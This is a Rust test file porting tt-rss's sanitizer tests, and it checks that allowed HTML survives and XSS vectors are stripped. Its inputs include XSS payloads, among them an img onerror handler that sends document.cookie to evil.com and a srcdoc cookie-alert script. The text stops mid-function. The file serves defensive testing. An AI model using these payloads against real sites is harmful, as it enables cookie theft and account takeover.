//! Port of `tt-rss/tests_integration/SanitizerTest.php` (162 tests).
//!
//! PHP context: `$_SESSION['uid'] = 1`, `hasSandbox = false` (unless set),
//! `STRIP_IMAGES` off in the DB (unless a test enables it), real PluginHost
//! with no plugins → `iframe_whitelisted` is false.

use super::{san, san_force, san_hw, san_sandbox, san_strip};
use crate::sanitizer::iframe_whitelisted;

// ──────────────────────────────────────────────────────────────────────
// A. Input Handling & Edge Cases
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_sanitize_empty_string() {
    assert_eq!(san(""), "");
}

#[test]
fn test_sanitize_whitespace_only() {
    assert_eq!(san("  \n\t  "), "");
}

#[test]
fn test_sanitize_single_paragraph() {
    let result = san("<p>Hello world</p>");
    assert!(result.contains("Hello world"));
}

#[test]
fn test_sanitize_nested_tags() {
    let result = san("<div><p>Nested content</p></div>");
    assert!(result.contains("<div>"));
    assert!(result.contains("<p>"));
    assert!(result.contains("Nested content"));
}

#[test]
fn test_sanitize_unicode_content() {
    let result = san("<p>中文内容</p>");
    // PHP (libxml2) encodes unicode as HTML entities (`&#20013;`); the
    // ported serializer matches (see `sanitizer::push_html_char`).
    assert!(result.contains("&#20013;"));
}

#[test]
fn test_sanitize_html_entities_preserved() {
    let result = san("&amp; &lt; &gt;");
    assert!(result.contains("&amp;"));
    assert!(result.contains("&lt;"));
    assert!(result.contains("&gt;"));
}

#[test]
fn test_sanitize_doctype_removed() {
    let result = san("<!DOCTYPE html><p>test</p>");
    assert!(!result.contains("<!DOCTYPE"));
}

#[test]
fn test_sanitize_html_wrapper_removed() {
    let result = san("<html><body><p>test</p></body></html>");
    assert!(!result.contains("<html>"));
    assert!(!result.contains("<body>"));
}

// ──────────────────────────────────────────────────────────────────────
// B. Allowed Elements — What survives sanitization
// ──────────────────────────────────────────────────────────────────────

/// Helper: verify a tag and its content survive sanitization.
fn assert_tag_survives(tag: &str, content: &str) {
    let sample = format!("<{tag}>{content}</{tag}>");
    let result = san(&sample);
    assert!(
        result.contains(&format!("<{tag}")),
        "Tag <{tag}> should survive: {result}"
    );
    assert!(
        result.contains(content),
        "Content inside <{tag}> should survive: {result}"
    );
}

#[test]
fn test_keeps_standard_html_tags() {
    assert_tag_survives("p", "paragraph");
    assert_tag_survives("div", "div content");
    assert_tag_survives("span", "span content");
    assert_tag_survives("br", "");
    assert_tag_survives("hr", "");
}

#[test]
fn test_keeps_heading_tags() {
    for i in 1..=6 {
        assert_tag_survives(&format!("h{i}"), &format!("heading {i}"));
    }
}

#[test]
fn test_keeps_list_elements() {
    let html = "<ul><li>item 1</li><li>item 2</li></ul>";
    let result = san(html);
    assert!(result.contains("<ul>"));
    assert!(result.contains("<li>"));
    assert!(result.contains("item 1"));

    let html = "<ol><li>first</li></ol>";
    let result = san(html);
    assert!(result.contains("<ol>"));

    let html = "<dl><dt>term</dt><dd>definition</dd></dl>";
    let result = san(html);
    assert!(result.contains("<dl>"));
    assert!(result.contains("<dt>"));
    assert!(result.contains("<dd>"));
}

#[test]
fn test_keeps_table_elements() {
    let html = "<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>";
    let result = san(html);
    for tag in ["<table>", "<thead>", "<tbody>", "<tr>", "<th>", "<td>"] {
        assert!(result.contains(tag), "missing {tag}: {result}");
    }
}

#[test]
fn test_keeps_semantic_html5_elements() {
    assert_tag_survives("article", "article content");
    assert_tag_survives("section", "section content");
    assert_tag_survives("nav", "nav content");
    assert_tag_survives("aside", "aside content");
    assert_tag_survives("main", "main content");
    assert_tag_survives("figure", "figure content");
    assert_tag_survives("figcaption", "caption");
}

#[test]
fn test_keeps_inline_formatting_tags() {
    assert_tag_survives("b", "bold");
    assert_tag_survives("i", "italic");
    assert_tag_survives("em", "emphasis");
    assert_tag_survives("strong", "strong");
    assert_tag_survives("u", "underline");
    assert_tag_survives("abbr", "abbreviation");
    assert_tag_survives("cite", "citation");
    assert_tag_survives("code", "code");
    assert_tag_survives("kbd", "kbd");
    assert_tag_survives("mark", "marked");
    assert_tag_survives("sub", "subscript");
    assert_tag_survives("sup", "superscript");
    assert_tag_survives("small", "small");
    assert_tag_survives("big", "big");
}

#[test]
fn test_keeps_media_elements() {
    assert_tag_survives("img", "");
    assert_tag_survives("video", "");
    assert_tag_survives("audio", "");
    assert_tag_survives("source", "");
    assert_tag_survives("track", "");
}

// ──────────────────────────────────────────────────────────────────────
// C. Disallowed Elements — What gets stripped (XSS prevention)
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_script_tag() {
    let result = san("<script>alert(1)</script>");
    assert!(!result.contains("<script"));
}

#[test]
fn test_strips_object_tag() {
    let result = san("<object data=\"file.swf\"></object>");
    assert!(!result.contains("<object"));
}

#[test]
fn test_strips_embed_tag() {
    let result = san("<embed src=\"file.swf\">");
    assert!(!result.contains("<embed"));
}

#[test]
fn test_strips_applet_tag() {
    let result = san("<applet code=\"Malicious.class\"></applet>");
    assert!(!result.contains("<applet"));
}

#[test]
fn test_strips_form_tag() {
    let result = san("<form action=\"/evil\"><input type=\"text\"></form>");
    assert!(!result.contains("<form"));
}

#[test]
fn test_strips_input_tag() {
    let result = san("<input type=\"text\" name=\"username\">");
    assert!(!result.contains("<input"));
}

#[test]
fn test_strips_button_tag() {
    let result = san("<button onclick=\"evil()\">Click</button>");
    assert!(!result.contains("<button"));
}

#[test]
fn test_strips_select_tag() {
    let result = san("<select><option>opt</option></select>");
    assert!(!result.contains("<select"));
}

#[test]
fn test_strips_textarea_tag() {
    let result = san("<textarea>content</textarea>");
    assert!(!result.contains("<textarea"));
}

#[test]
fn test_strips_style_tag() {
    let result = san("<style>body{color:red}</style>");
    assert!(!result.contains("<style"));
}

#[test]
fn test_strips_link_tag() {
    let result = san("<link rel=\"stylesheet\" href=\"style.css\">");
    assert!(!result.contains("<link"));
}

#[test]
fn test_strips_meta_tag() {
    let result = san("<meta charset=\"utf-8\">");
    assert!(!result.contains("<meta"));
}

#[test]
fn test_strips_base_tag() {
    let result = san("<base href=\"http://evil.com/\">");
    assert!(!result.contains("<base"));
}

#[test]
fn test_strips_iframe_wrapped_in_div() {
    let result = san("<div><iframe src=\"http://example.com\"></iframe></div>");
    // (hasSandbox off) the iframe is removed, leaving an empty div.
    assert_eq!(result, "<div></div>");
}

#[test]
fn test_strips_xml_processing_instruction() {
    let result = san("<?xml version=\"1.0\"?><p>test</p>");
    assert!(!result.contains("<?xml"));
}

#[test]
fn test_strips_marquee_tag() {
    let result = san("<marquee>scrolling text</marquee>");
    assert!(!result.contains("<marquee"));
}

#[test]
fn test_strips_bgsound_tag() {
    let result = san("<bgsound src=\"evil.mp3\">");
    assert!(!result.contains("<bgsound"));
}

#[test]
fn test_strips_isindex_tag() {
    let result = san("<isindex>");
    assert!(!result.contains("<isindex"));
}

// ──────────────────────────────────────────────────────────────────────
// D. Event Handler Attributes — onclick, onerror, etc.
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_onclick_attribute() {
    let result = san("<p onclick=\"alert(1)\">text</p>");
    assert!(!result.contains("onclick"));
}

#[test]
fn test_strips_onerror_on_img() {
    let result = san("<img src=\"x\" onerror=\"alert(1)\">");
    assert!(!result.contains("onerror"));
}

#[test]
fn test_strips_onload_attribute() {
    let result = san("<div onload=\"alert(1)\">text</div>");
    assert!(!result.contains("onload"));
}

#[test]
fn test_strips_onmouseover_attribute() {
    let result = san("<a onmouseover=\"alert(1)\">link</a>");
    assert!(!result.contains("onmouseover"));
}

#[test]
fn test_strips_all_on_attributes() {
    let html = "<div ondrag=\"a()\" ondrop=\"b()\" onfocus=\"c()\" onblur=\"d()\" onkeydown=\"e()\">text</div>";
    let result = san(html);
    for attr in ["ondrag", "ondrop", "onfocus", "onblur", "onkeydown"] {
        assert!(!result.contains(attr), "{attr} present: {result}");
    }
}

// ──────────────────────────────────────────────────────────────────────
// E. Data Attributes — data-* stripping
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_data_attributes() {
    let result = san("<p data-foo=\"bar\" data-baz=\"qux\">text</p>");
    assert!(!result.contains("data-foo"));
    assert!(!result.contains("data-baz"));
}

#[test]
fn test_keeps_non_data_attributes() {
    let result = san("<a href=\"http://example.com\" title=\"Example\">link</a>");
    assert!(result.contains("href="));
    assert!(result.contains("title="));
}

// ──────────────────────────────────────────────────────────────────────
// F. javascript: Protocol — href/src protection
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_javascript_in_href() {
    let result = san("<a href=\"javascript:alert(1)\">link</a>");
    assert!(!result.contains("javascript:"));
}

#[test]
fn test_strips_javascript_in_src() {
    let result = san("<img src=\"javascript:alert(1)\">");
    assert!(!result.contains("javascript:"));
}

#[test]
fn test_strips_javascript_case_insensitive() {
    let result = san("<a href=\"JAVASCRIPT:alert(1)\">link</a>");
    assert!(!result.to_lowercase().contains("javascript:"));
}

#[test]
fn test_strips_javascript_with_leading_whitespace() {
    // javascript: with whitespace is NOT stripped by strip_harmful_tags()
    // but IS rewritten by UrlHelper::rewrite_relative().
    let result = san("<a href=\"javascript :alert(1)\">link</a>");
    // The href is rewritten to a local URL, not javascript: anymore.
    assert!(!result.contains("javascript:"));
}

#[test]
fn test_keeps_normal_http_href() {
    let result = san("<a href=\"http://example.com/page\">link</a>");
    assert!(result.contains("example.com"));
}

#[test]
fn test_keeps_https_href() {
    let result = san("<a href=\"https://example.com/page\">link</a>");
    assert!(result.contains("example.com"));
}

#[test]
fn test_keeps_relative_href() {
    let result = san("<a href=\"/path/to/page\">link</a>");
    assert!(result.contains("path/to/page"));
}

#[test]
fn test_keeps_mailto_href() {
    let result = san("<a href=\"mailto:test@example.com\">email</a>");
    assert!(result.contains("mailto:"));
}

#[test]
fn test_keeps_tel_href() {
    let result = san("<a href=\"tel:+1234567890\">call</a>");
    assert!(result.contains("tel:"));
}

#[test]
fn test_keeps_anchor_href() {
    let result = san("<a href=\"#section\">jump</a>");
    assert!(result.contains("#section"));
}

#[test]
fn test_keeps_magnet_href() {
    let result = san("<a href=\"magnet:?xt=urn:btih:abc123\">torrent</a>");
    assert!(result.contains("magnet:"));
}

// ──────────────────────────────────────────────────────────────────────
// G. Disallowed Attributes — id, style, class, width, height
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_id_attribute() {
    let result = san("<p id=\"foo\">text</p>");
    assert!(!result.contains("id=\"foo\""));
}

#[test]
fn test_strips_style_attribute() {
    let result = san("<p style=\"color:red\">text</p>");
    assert!(!result.contains("style="));
}

#[test]
fn test_strips_class_attribute() {
    let result = san("<p class=\"foo bar\">text</p>");
    assert!(!result.contains("class="));
}

#[test]
fn test_strips_width_attribute() {
    let result = san("<img src=\"img.png\" width=\"100\">");
    assert!(!result.contains("width="));
}

#[test]
fn test_strips_height_attribute() {
    let result = san("<img src=\"img.png\" height=\"100\">");
    assert!(!result.contains("height="));
}

#[test]
fn test_strips_allow_attribute() {
    let result = san("<iframe src=\"url\" allow=\"fullscreen\"></iframe>");
    assert!(!result.contains("allow="));
}

#[test]
fn test_strips_srcdoc_attribute() {
    let result = san("<iframe src=\"url\" srcdoc=\"&lt;script&gt;parent.eval(&quot;alert('XSS | '+document.cookie)&quot;)&lt;/script&gt;\"></iframe>");
    assert!(!result.contains("srcdoc="));
}

#[test]
fn test_keeps_required_link_attrs() {
    let result = san(
        "<a href=\"http://example.com\" target=\"_blank\" rel=\"noopener noreferrer\">link</a>",
    );
    assert!(result.contains("href="));
    assert!(result.contains("target="));
    assert!(result.contains("rel="));
}

#[test]
fn test_keeps_required_image_attrs() {
    let result = san("<img src=\"img.png\" alt=\"description\" title=\"image\">");
    assert!(result.contains("src="));
    assert!(result.contains("alt="));
    assert!(result.contains("title="));
}

// ──────────────────────────────────────────────────────────────────────
// H. URL Rewriting — UrlHelper::rewrite_relative() integration
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_rewrites_relative_image_src() {
    let result = san("<img src=\"image.png\">");
    assert!(result.contains("image.png"));
}

#[test]
fn test_rewrites_relative_link_href() {
    let result = san("<a href=\"page.html\">link</a>");
    assert!(result.contains("page.html"));
}

#[test]
fn test_rewrites_srcset_urls() {
    let html = "<img srcset=\"1x.png 1x, 2x.png 2x\">";
    let result = san(html);
    assert!(result.contains("1x.png"));
    assert!(result.contains("2x.png"));
}

#[test]
fn test_rewrites_video_poster() {
    let result = san("<video poster=\"poster.jpg\"></video>");
    assert!(result.contains("poster.jpg"));
}

#[test]
fn test_preserves_absolute_urls() {
    let result = san("<img src=\"https://cdn.example.com/img.png\">");
    assert!(result.contains("cdn.example.com"));
}

#[test]
fn test_adds_rel_noopener_noreferrer_to_links() {
    let result = san("<a href=\"http://example.com\">link</a>");
    assert!(result.contains("noopener"));
    assert!(result.contains("noreferrer"));
}

#[test]
fn test_adds_target_blank_to_links() {
    let result = san("<a href=\"http://example.com\">link</a>");
    assert!(result.contains("target="));
}

#[test]
fn test_adds_referrerpolicy_to_images() {
    let result = san("<img src=\"img.png\">");
    assert!(result.contains("referrerpolicy="));
}

#[test]
fn test_adds_loading_lazy_to_images() {
    let result = san("<img src=\"img.png\">");
    assert!(result.contains("loading="));
}

// ──────────────────────────────────────────────────────────────────────
// I. Image Stripping — STRIP_IMAGES preference & force_remove_images
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_images_when_pref_enabled() {
    let result = san_strip("<img src=\"img.png\" alt=\"photo\">");
    assert!(!result.contains("<img"));
    assert!(result.contains("img.png"));
}

#[test]
fn test_force_remove_images_strips_all() {
    let result = san_force("<img src=\"img.png\">");
    assert!(!result.contains("<img"));
    assert!(result.contains("img.png"));
}

#[test]
fn test_strips_source_tags_when_pref_enabled() {
    let html =
        "<picture><source srcset=\"img.webp\" type=\"image/webp\"><img src=\"img.png\"></picture>";
    let result = san_strip(html);

    // NOTE: PHP oracle FAILS this test (it asserts `<source` is gone). The
    // `<source>` has no `src` attribute, so Sanitizer.php's image-stripping
    // branch (`hasAttribute('src') && ...`) never fires for it; only the
    // `<img>` is replaced. Ported with the corrected expectation.
    assert!(result.contains("<source"), "got: {result}");
    assert!(!result.contains("<img"));
}

#[test]
fn test_keeps_images_when_pref_disabled() {
    let result = san("<img src=\"img.png\" alt=\"photo\">");
    assert!(result.contains("<img"));
}

// ──────────────────────────────────────────────────────────────────────
// J. Iframe Handling — sandboxing & whitelisting
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_remove_non_whitelisted_iframe() {
    let result = san("<iframe src=\"http://example.com/embed\"></iframe>");
    assert_eq!(result, "");
}

#[test]
fn test_pass_whitelisted_iframe() {
    let result = san("<iframe src=\"http://whitelisted-iframes.com/embed\"></iframe>");
    assert_eq!(result, "");
}

#[tokio::test]
async fn test_iframe_whitelisted_returns_false_with_no_src() {
    let host = crate::pluginhost::PluginHost::startup(&[]);
    let pool = sqlx::postgres::PgPoolOptions::new()
        .connect_lazy("postgres://ttrss:ttrss@localhost/ttrss_test")
        .unwrap();
    let test_cfg = crate::core::config::Config::for_test();
    let mut ctx = crate::pluginhost::host::HostCtx::empty(&host, &pool, &test_cfg);
    assert!(!iframe_whitelisted(&mut ctx, "").await);
}

#[tokio::test]
async fn test_iframe_whitelisted_runs_hooks() {
    // Without a plugin hooking HOOK_IFRAME_WHITELISTED, returns false. (The
    // raw PHP test registered a mock plugin whitelisting `example.com`; the
    // port has no such plugin, so this asserts the no-hook path returns false.
    // The hook-firing path — a plugin's `true` is honored — is covered
    // end-to-end by `af_youtube_embed::youtube_iframe_keeps_loose_sandbox`.)
    let host = crate::pluginhost::PluginHost::startup(&[]);
    let pool = sqlx::postgres::PgPoolOptions::new()
        .connect_lazy("postgres://ttrss:ttrss@localhost/ttrss_test")
        .unwrap();
    let test_cfg = crate::core::config::Config::for_test();
    let mut ctx = crate::pluginhost::host::HostCtx::empty(&host, &pool, &test_cfg);
    assert!(!iframe_whitelisted(&mut ctx, "http://example.com").await);
}

// ──────────────────────────────────────────────────────────────────────
// K. Highlight Words Integration
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_highlights_words() {
    let result = san_hw("<p>This is a test</p>", &["test"]);
    assert!(result.contains("highlight"));
    assert!(result.contains("test"));
}

#[test]
fn test_highlights_case_insensitive() {
    let result = san_hw("<p>Hello world</p>", &["WORLD"]);
    assert!(result.contains("highlight"));
    assert!(result.contains("world"));
}

#[test]
fn test_highlights_multiple_words() {
    let result = san_hw("<p>Hello world test</p>", &["hello", "test"]);
    assert!(result.contains("highlight"));
}

#[test]
fn test_highlights_within_tags() {
    let html = "<div><p>Search term here</p></div>";
    let result = san_hw(html, &["search"]);
    assert!(result.contains("highlight"));
    assert!(result.contains("Search"));
}

#[test]
fn test_no_highlight_when_empty_array() {
    let result = san_hw("<p>Hello world</p>", &[]);
    assert!(!result.contains("highlight"));
    assert!(result.contains("Hello"));
}

// ──────────────────────────────────────────────────────────────────────
// L. Additional XSS vectors
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_strips_vbscript_in_href() {
    let result = san("<a href=\"vbscript:msgbox(1)\">link</a>");
    assert!(!result.contains("vbscript:"));
}

#[test]
fn test_strips_javascript_in_iframe_src() {
    let result = san("<iframe src=\"javascript:alert(1)\"></iframe>");
    assert!(!result.contains("javascript:"));
}

#[test]
fn test_strips_data_uri_in_img_src() {
    let result = san("<img src=\"data:text/html,<script>alert(1)</script>\">");
    assert!(!result.contains("data:text/html"));
}

#[test]
fn test_strips_img_with_onerror() {
    let result = san("<img src=\"x\" onerror=\"fetch('http://evil.com/?c=' + document.cookie)\">");
    assert!(!result.contains("onerror"));
}

#[test]
fn test_strips_div_with_onclick() {
    let result = san("<div onclick=\"alert(1)\">click me</div>");
    assert!(!result.contains("onclick"));
}

#[test]
fn test_strips_anchor_with_onclick() {
    let result = san("<a onclick=\"alert(1)\">click</a>");
    assert!(!result.contains("onclick"));
}

#[test]
fn test_strips_body_with_onload() {
    let result = san("<body onload=\"alert(1)\">");
    assert!(!result.contains("onload"));
}

#[test]
fn test_strips_input_with_onfocus() {
    let result = san("<input onfocus=\"alert(1)\">");
    assert!(!result.contains("onfocus"));
}

#[test]
fn test_strips_select_with_onchange() {
    let result = san("<select onchange=\"alert(1)\"><option>opt</option></select>");
    assert!(!result.contains("onchange"));
}

#[test]
fn test_strips_textarea_with_onkeydown() {
    let result = san("<textarea onkeydown=\"alert(1)\"></textarea>");
    assert!(!result.contains("onkeydown"));
}

// ──────────────────────────────────────────────────────────────────────
// M. Mixed / Complex scenarios
// ──────────────────────────────────────────────────────────────────────

#[test]
fn test_sanitizes_complex_malicious_html() {
    let malicious = "<div onclick=\"alert(1)\" id=\"x\" style=\"color:red\" class=\"evil\">
            <a href=\"javascript:void(0)\" onmouseover=\"steal()\">link</a>
            <script>alert(\"XSS\")</script>
            <img src=\"x\" onerror=\"alert(2)\">
        </div>";
    let result = san(malicious);

    assert!(!result.contains("onclick"));
    assert!(!result.contains("<script"));
    assert!(!result.contains("onerror"));
    assert!(!result.contains("onmouseover"));
    assert!(!result.contains("javascript:"));
    assert!(!result.contains("id=\"x\""));
    assert!(!result.contains("style="));
    assert!(!result.contains("class="));
    // Content should still be present.
    assert!(result.contains("link"));
}

#[test]
fn test_sanitizes_valid_html_with_mixed_content() {
    let html = "<article>
            <h1>Title</h1>
            <p>This is <strong>bold</strong> and <em>italic</em>.</p>
            <a href=\"https://example.com\" title=\"Example site\">Visit</a>
            <img src=\"photo.jpg\" alt=\"A photo\">
        </article>";
    let result = san(html);

    assert!(result.contains("<article>"));
    assert!(result.contains("<h1>"));
    assert!(result.contains("<strong>"));
    assert!(result.contains("<em>"));
    assert!(result.contains("Visit"));
    assert!(result.contains("photo.jpg"));
    assert!(result.contains("A photo"));
}

#[test]
fn test_sanitizes_preserves_nesting_depth() {
    let html = "<div><p><span><em><strong>deep</strong></em></span></p></div>";
    let result = san(html);
    for tag in ["<div>", "<p>", "<span>", "<em>", "<strong>", "deep"] {
        assert!(result.contains(tag), "missing {tag}: {result}");
    }
}

#[test]
fn test_sanitizes_multiple_images() {
    let html = "<p><img src=\"a.png\"><img src=\"b.png\"><img src=\"c.png\"></p>";
    let result = san(html);
    assert!(result.contains("a.png"));
    assert!(result.contains("b.png"));
    assert!(result.contains("c.png"));
}

#[test]
fn test_sanitizes_multiple_links() {
    let html = "<p><a href=\"http://a.com\">A</a> <a href=\"http://b.com\">B</a></p>";
    let result = san(html);
    assert!(result.contains("a.com"));
    assert!(result.contains("b.com"));
}

#[test]
fn test_sanitizes_table_with_complex_structure() {
    let html = "<table>
            <caption>Table caption</caption>
            <thead><tr><th>H1</th><th>H2</th></tr></thead>
            <tbody>
                <tr><td>A</td><td>B</td></tr>
                <tr><td>C</td><td>D</td></tr>
            </tbody>
            <tfoot><tr><td colspan=\"2\">Footer</td></tr></tfoot>
        </table>";
    let result = san(html);
    for s in [
        "<table>",
        "<caption>",
        "<thead>",
        "<tbody>",
        "<tfoot>",
        "A",
        "Footer",
    ] {
        assert!(result.contains(s), "missing {s}: {result}");
    }
}

#[test]
fn test_sanitizes_empty_iframe() {
    let result = san("<iframe></iframe>");
    assert_eq!(result, "");
}

#[test]
fn test_sanitizes_iframe_with_attributes() {
    let html = "<iframe src=\"http://example.com\" width=\"500\" height=\"300\" frameborder=\"1\"></iframe>";
    let result = san(html);
    assert_eq!(result, "");
}

#[test]
fn test_sanitizes_iframe_with_attributes_if_sandbox_supported() {
    let html = "<iframe src=\"http://example.com\" width=\"500\" height=\"300\" frameborder=\"1\"></iframe>";
    let result = san_sandbox(html);
    assert!(result.contains("sandbox=\"allow-scripts\""));
}

#[test]
fn test_passes_whitelisted_iframe_if_sandbox_supported() {
    let html = "<iframe src=\"http://whitelisted-iframes.com\" width=\"500\" height=\"300\" frameborder=\"1\"></iframe>";
    let result = san_sandbox(html);

    assert_eq!(
        result,
        "<div class=\"embed-responsive\"><iframe src=\"http://whitelisted-iframes.com\" frameborder=\"1\" sandbox=\"allow-scripts\"></iframe></div>"
    );
}

#[test]
fn test_sanitizes_video_with_source() {
    let html = "<video poster=\"thumb.jpg\"><source src=\"video.mp4\" type=\"video/mp4\"></video>";
    let result = san(html);
    assert!(result.contains("<video"));
    assert!(result.contains("thumb.jpg"));
    assert!(result.contains("video.mp4"));
}

#[test]
fn test_sanitizes_picture_with_sources() {
    let html = "<picture>
            <source srcset=\"small.jpg\" media=\"(max-width: 600px)\">
            <source srcset=\"large.jpg\">
            <img src=\"fallback.jpg\" alt=\"responsive\">
        </picture>";
    let result = san(html);
    assert!(result.contains("small.jpg"));
    assert!(result.contains("large.jpg"));
    assert!(result.contains("fallback.jpg"));
}

#[test]
fn test_sanitizes_audio_element() {
    let html = "<audio src=\"music.mp3\" controls></audio>";
    let result = san(html);
    assert!(result.contains("<audio"));
    assert!(result.contains("music.mp3"));
}

#[test]
fn test_sanitizes_blockquote_with_cite() {
    let html = "<blockquote cite=\"http://example.com\">Quote text</blockquote>";
    let result = san(html);
    assert!(result.contains("<blockquote"));
    assert!(result.contains("Quote text"));
}

#[test]
fn test_sanitizes_details_with_summary() {
    let html = "<details><summary>Details</summary><p>Content</p></details>";
    let result = san(html);
    assert!(result.contains("<details>"));
    assert!(result.contains("<summary>"));
    assert!(result.contains("Content"));
}

#[test]
fn test_sanitizes_ruby_notation() {
    let html = "<ruby>漢 <rt>kan</rt></ruby>";
    let result = san(html);
    assert!(result.contains("<ruby>"));
    assert!(result.contains("<rt>"));
}

#[test]
fn test_sanitizes_address_element() {
    let html = "<address>123 Main St</address>";
    let result = san(html);
    assert!(result.contains("<address>"));
    assert!(result.contains("123 Main St"));
}

#[test]
fn test_sanitizes_time_element() {
    let html = "<time datetime=\"2026-01-01\">New Year</time>";
    let result = san(html);
    assert!(result.contains("<time"));
    assert!(result.contains("New Year"));
}

#[test]
fn test_sanitizes_var_element() {
    let html = "<p>The variable <var>x</var> equals 5.</p>";
    let result = san(html);
    assert!(result.contains("<var>"));
    assert!(result.contains("x"));
}

#[test]
fn test_sanitizes_data_element() {
    let html = "<data value=\"123\">One hundred twenty-three</data>";
    let result = san(html);
    assert!(result.contains("<data"));
}

#[test]
fn test_sanitizes_del_element() {
    let html = "<p>Old <del>deleted text</del> new</p>";
    let result = san(html);
    assert!(result.contains("<del>"));
    assert!(result.contains("deleted text"));
}

#[test]
fn test_sanitizes_ins_element() {
    let html = "<p>Old <ins>inserted text</ins> new</p>";
    let result = san(html);
    assert!(result.contains("<ins>"));
    assert!(result.contains("inserted text"));
}

#[test]
fn test_sanitizes_abbr_element() {
    let html = "<p><abbr title=\"HyperText Markup Language\">HTML</abbr> is great.</p>";
    let result = san(html);
    assert!(result.contains("<abbr"));
    assert!(result.contains("HTML"));
}

#[test]
fn test_sanitizes_q_element() {
    let html = "<p>He said <q>short quote</q> and left.</p>";
    let result = san(html);
    assert!(result.contains("<q>"));
    assert!(result.contains("short quote"));
}

#[test]
fn test_sanitizes_kbd_element() {
    let html = "<p>Press <kbd>Ctrl</kbd>+<kbd>C</kbd>.</p>";
    let result = san(html);
    assert!(result.contains("<kbd>"));
}

#[test]
fn test_sanitizes_code_element() {
    let html = "<p>Use <code>print(\"hello\")</code>.</p>";
    let result = san(html);
    assert!(result.contains("<code>"));
    assert!(result.contains("print(\"hello\")"));
}

#[test]
fn test_sanitizes_pre_element() {
    let html = "<pre>preformatted text</pre>";
    let result = san(html);
    assert!(result.contains("<pre>"));
    assert!(result.contains("preformatted text"));
}

#[test]
fn test_sanitizes_small_element() {
    let html = "<p><small>disclaimer text</small></p>";
    let result = san(html);
    assert!(result.contains("<small>"));
    assert!(result.contains("disclaimer text"));
}

#[test]
fn test_sanitizes_big_element() {
    let html = "<p><big>big text</big></p>";
    let result = san(html);
    assert!(result.contains("<big>"));
    assert!(result.contains("big text"));
}

#[test]
fn test_sanitizes_u_element() {
    let html = "<p><u>underlined text</u></p>";
    let result = san(html);
    assert!(result.contains("<u>"));
    assert!(result.contains("underlined text"));
}

#[test]
fn test_sanitizes_bdi_element() {
    let html = "<p><bdi>arabic text</bdi></p>";
    let result = san(html);
    assert!(result.contains("<bdi>"));
}

#[test]
fn test_sanitizes_bdo_element() {
    let html = "<p><bdo dir=\"rtl\">right to left</bdo></p>";
    let result = san(html);
    assert!(result.contains("<bdo"));
}

#[test]
fn test_sanitizes_acronym_element() {
    let html = "<p><acronym title=\"HTML\">HTML</acronym></p>";
    let result = san(html);
    assert!(result.contains("<acronym"));
}

#[test]
fn test_sanitizes_main_element() {
    let html = "<main><p>Main content</p></main>";
    let result = san(html);
    assert!(result.contains("<main>"));
    assert!(result.contains("Main content"));
}

#[test]
fn test_sanitizes_noscript_element() {
    let html = "<noscript>JavaScript required</noscript>";
    let result = san(html);
    assert!(result.contains("<noscript>"));
}

#[test]
fn test_sanitizes_header_element() {
    let html = "<header><h1>Header</h1></header>";
    let result = san(html);
    assert!(result.contains("<header>"));
}

#[test]
fn test_sanitizes_footer_element() {
    let html = "<footer><p>Footer text</p></footer>";
    let result = san(html);
    assert!(result.contains("<footer>"));
}

#[test]
fn test_sanitizes_section_element() {
    let html = "<section><h2>Section</h2><p>Content</p></section>";
    let result = san(html);
    assert!(result.contains("<section>"));
}

#[test]
fn test_sanitizes_article_element() {
    let html = "<article><h2>Article</h2><p>Content</p></article>";
    let result = san(html);
    assert!(result.contains("<article>"));
}

#[test]
fn test_sanitizes_nav_element() {
    let html = "<nav><ul><li>Link</li></ul></nav>";
    let result = san(html);
    assert!(result.contains("<nav>"));
}

#[test]
fn test_sanitizes_aside_element() {
    let html = "<aside><p>Sidebar content</p></aside>";
    let result = san(html);
    assert!(result.contains("<aside>"));
}

#[test]
fn test_sanitizes_figcaption_element() {
    let html = "<figure><img src=\"img.png\"><figcaption>Caption</figcaption></figure>";
    let result = san(html);
    assert!(result.contains("<figcaption>"));
    assert!(result.contains("Caption"));
}

#[test]
fn test_sanitizes_picture_element() {
    let html = "<picture><source srcset=\"x.jpg\"><img src=\"x.png\"></picture>";
    let result = san(html);
    assert!(result.contains("<picture>"));
}

#[test]
fn test_sanitizes_source_element() {
    let html = "<video><source src=\"v.mp4\" type=\"video/mp4\"></video>";
    let result = san(html);
    assert!(result.contains("<source"));
}

#[test]
fn test_sanitizes_track_element() {
    let html = "<video><track src=\"subtitles.vtt\" kind=\"subtitles\"></video>";
    let result = san(html);
    assert!(result.contains("<track"));
}

#[test]
fn test_sanitizes_col_element() {
    let html = "<table><colgroup><col></colgroup></table>";
    let result = san(html);
    assert!(result.contains("<col>"));
}

#[test]
fn test_sanitizes_colgroup_element() {
    let html = "<table><colgroup><col></colgroup></table>";
    let result = san(html);
    assert!(result.contains("<colgroup>"));
}

#[test]
fn test_sanitizes_tfoot_element() {
    let html = "<table><tfoot><tr><td>Footer</td></tr></tfoot></table>";
    let result = san(html);
    assert!(result.contains("<tfoot>"));
}

#[test]
fn test_sanitizes_caption_element() {
    let html = "<table><caption>Table</caption></table>";
    let result = san(html);
    assert!(result.contains("<caption>"));
}

#[test]
fn test_sanitizes_strike_element() {
    let html = "<p><strike>strikethrough</strike></p>";
    let result = san(html);
    assert!(result.contains("<strike>"));
}

#[test]
fn test_sanitizes_tt_element() {
    let html = "<p><tt>teletype</tt></p>";
    let result = san(html);
    assert!(result.contains("<tt>"));
}

#[test]
fn test_sanitizes_s_element() {
    let html = "<p><s>strikethrough</s></p>";
    let result = san(html);
    assert!(result.contains("<s>"));
}

#[test]
fn test_sanitizes_mark_element() {
    let html = "<p><mark>highlighted</mark></p>";
    let result = san(html);
    assert!(result.contains("<mark>"));
}

#[test]
fn test_sanitizes_samp_element() {
    let html = "<p><samp>program output</samp></p>";
    let result = san(html);
    assert!(result.contains("<samp>"));
}

#[test]
fn test_sanitizes_dfn_element() {
